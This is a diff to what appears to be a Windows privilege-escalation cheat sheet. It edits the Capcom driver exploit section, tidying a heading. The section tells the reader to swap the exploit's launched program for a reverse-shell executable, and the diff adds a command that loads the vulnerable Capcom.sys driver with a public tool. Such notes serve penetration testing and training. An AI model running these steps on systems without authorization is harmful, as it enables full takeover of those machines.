@@ -104,10 +104,16 @@ Exploit with the [tool](https://github.com/tandasat/ExploitCapcom)
 ```
 .\ExploitCapcom.exe
 ```
-EXploit without GUI
+Exploit without GUI:
+
 ExploitCapcom.cpp change this file TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe"); this for a revshell
 ```
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+```
+
+Automated [tool](https://github.com/TarlogicSecurity/EoPLoadDriver/)
+```  
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```
 
 ## Server Operators
